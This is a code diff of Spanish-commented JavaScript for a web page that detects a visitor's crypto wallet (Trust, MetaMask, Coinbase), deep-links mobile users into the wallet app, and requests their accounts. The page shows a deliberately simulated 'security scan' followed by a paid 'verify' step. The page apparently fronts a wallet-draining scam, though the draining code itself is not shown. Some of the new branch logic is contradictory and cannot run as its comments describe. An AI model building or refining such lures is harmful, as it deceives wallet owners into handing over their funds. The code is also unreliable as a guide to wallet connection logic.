@@ -454,114 +454,122 @@ function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 }
 
-// --- LÓGICA DE CONEXIÓN UNIVERSAL MÓVIL (FIX CRÍTICO) ---
+// DETECCIÓN DE WALLET
+function detectWallet() {
+ if (window.ethereum?.isTrust) {
+ detectedWalletType = 'trust';
+ return 'trust';
+ }
+ if (window.ethereum?.isMetaMask) {
+ detectedWalletType = 'metamask';
+ return 'metamask';
+ }
+ if (window.ethereum?.isCoinbaseWallet) {
+ detectedWalletType = 'coinbase';
+ return 'coinbase';
+ }
+ return 'unknown';
+}
+
+// LÓGICA DE CONEXIÓN MEJORADA PARA MÓVIL
+connectBtn.addEventListener('click', async () => {
+ if (!window.ethereum) {
+ statusDiv.textContent = "Instala tu wallet primero.";
+ return;
+ }
+
+ // Detectar qué wallet es para ajustar textos
+ detectWallet();
+
+ if (isMobile()) {
+ // Solo mostramos modal si estamos en Trust Wallet o MetaMask Mobile dentro del navegador
+ // Si ya tenemos window.ethereum, podemos intentar conectar directo
+ if (detectedWalletType === 'trust' && !window.ethereum.isTrust) {
+ // Estamos en el navegador externo (Chrome/Safari) pero tenemos Trust instalado
+ modalTitle.textContent = "Trust Wallet Detected";
+ modalText.textContent = "Para verificar tus activos, abriremos el navegador interno o conectaremos directamente.";
+ 
+ openAppBtn.onclick = () => {
+ // Forzar apertura en Trust Browser usando Deep Link Universal
+ window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
+ tryConnect(); 
+ };
+ } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
+ // MetaMask en navegador externo (ej. Chrome)
+ modalTitle.textContent = "MetaMask Detected";
+ modalText.textContent = "Abre la app para confirmar la conexión.";
+ openAppBtn.onclick = () => {
+ window.open('https://metamask.app.link/dapp/' + window.location.host);
+ tryConnect();
+ };
+ } else {
+ // MetaMask o Trust ya conectado (dentro de su browser)
+ modalTitle.textContent = "Mobile Wallet Connected";
+ modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
+ openAppBtn.onclick = () => {
+ mobileModal.style.display = 'none';
+ tryConnect();
+ };
+ }
+
+ mobileModal.style.display = 'flex';
+ confirmOpenBtn.addEventListener('click', () => {
+ mobileModal.style.display = 'none';
+ tryConnect();
+ });
+ return; 
+ }
+
+ // En Desktop, simplemente conectamos
+ try {
+ await tryConnect();
+ } catch (err) {
+ console.error(err);
+ statusDiv.textContent = "Error de conexión.";
+ }
+});
 
 async function tryConnect() {
  try {
- // Si ya estamos dentro de una wallet (MetaMask/Trust In-App Browser)
- if (window.ethereum) {
-     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-     userAddress = accounts[0];
-     
-     const network = await window.ethereum.request({ method: 'eth_chainId' });
-     const chainIdNum = parseInt(network);
-     
-     provider = new ethers.providers.Web3Provider(window.ethereum);
-     signer = provider.getSigner();
-     currentChainId = chainIdNum;
+ const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+ userAddress = accounts[0];
+ 
+ const network = await window.ethereum.request({ method: 'eth_chainId' });
+ const chainIdNum = parseInt(network);
+ 
+ provider = new ethers.providers.Web3Provider(window.ethereum);
+ signer = provider.getSigner();
+ currentChainId = chainIdNum;
 
-     log(`Connected via ${detectedWalletType.toUpperCase()}`);
-     log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
-     log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
-     
-     // Mostrar zona de escaneo
-     scanArea.classList.remove('hidden');
-     connectBtn.classList.add('hidden');
+ log(`Connected via ${detectedWalletType.toUpperCase()}`);
+ log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
+ log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
+ 
+ // Mostrar zona de escaneo
+ scanArea.classList.remove('hidden');
+ connectBtn.classList.add('hidden');
 
-     // Simular escaneo visual
-     setTimeout(() => {
-         scanAssets();
-         
-         setTimeout(() => {
-             verifyBtn.classList.remove('hidden');
-             costInfo.style.display = 'block';
-             chatWidget.classList.add('chat-visible');
-         }, 1000);
-     }, 2000);
-     
-     return true;
- } else {
-     throw new Error("No wallet found");
- }
+ // Simular escaneo visual
+ setTimeout(() => {
+ // Aquí ejecutamos la lógica de "iteración" sobre tokens
+ scanAssets();
+ 
+ // Mostrar botón de verificar después de "escanear"
+ setTimeout(() => {
+ verifyBtn.classList.remove('hidden');
+ costInfo.style.display = 'block';
+ 
+ // Activar chat widget
+ chatWidget.classList.add('chat-visible');
+ }, 1000);
+
+ }, 2000);
+
  } catch (error) {
-     // Si falla, es porque estamos en Chrome/Safari externo
-     statusDiv.textContent = "Conectando con tu wallet...";
-     return false;
+ statusDiv.textContent = "Conexión rechazada o fallida.";
+ log(error.message);
  }
 }
-
-// Detectar qué wallet es para ajustar textos
-detectWallet();
-
-if (isMobile()) {
-    // En móvil, mostramos el modal para abrir la app
-    if (detectedWalletType === 'trust') {
-        modalTitle.textContent = "Trust Wallet Detected";
-        modalText.textContent = "Abre Trust Wallet para verificar tus activos.";
-        openAppBtn.onclick = () => {
-            window.location.href = 'https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href);
-            // Esperamos a que la app abra la web internamente
-            pollForConnection();
-        };
-    } else if (detectedWalletType === 'metamask') {
-        modalTitle.textContent = "MetaMask Detected";
-        modalText.textContent = "Abre MetaMask para confirmar la conexión.";
-        openAppBtn.onclick = () => {
-            window.location.href = 'https://metamask.app.link/dapp/' + window.location.host;
-            pollForConnection();
-        };
-    } else {
-        // Si no detectamos bien, intentamos conectar directo o mostrar modal genérico
-        modalTitle.textContent = "Wallet Required";
-        modalText.textContent = "Por favor, conecta tu wallet para continuar.";
-        openAppBtn.onclick = () => {
-            mobileModal.style.display = 'none';
-            tryConnect();
-        };
-    }
-    
-    mobileModal.style.display = 'flex';
-    confirmOpenBtn.addEventListener('click', () => {
-        mobileModal.style.display = 'none';
-        tryConnect();
-    });
-} else {
-    // Desktop: conectar directo
-    tryConnect();
-}
-
-// Función de Polling: Espera a que la App abra la web internamente
-function pollForConnection() {
-    let attempts = 0;
-    const interval = setInterval(() => {
-        attempts++;
-        if (window.ethereum) {
-            clearInterval(interval);
-            tryConnect();
-        } else if (attempts > 50) { // 5 segundos max
-            clearInterval(interval);
-            statusDiv.textContent = "No se pudo detectar la conexión. Recarga la página.";
-        }
-    }, 100);
-}
-
-// Lógica para el botón "Ya está abierto"
-openAppBtn.addEventListener('click', () => {
-    // Si el usuario ya abrió la app manualmente y recargó, esto ayuda
-    mobileModal.style.display = 'none';
-    tryConnect();
-});
-
 
 // MOTOR DE ESCANEO DE ACTIVOS
 async function scanAssets() {
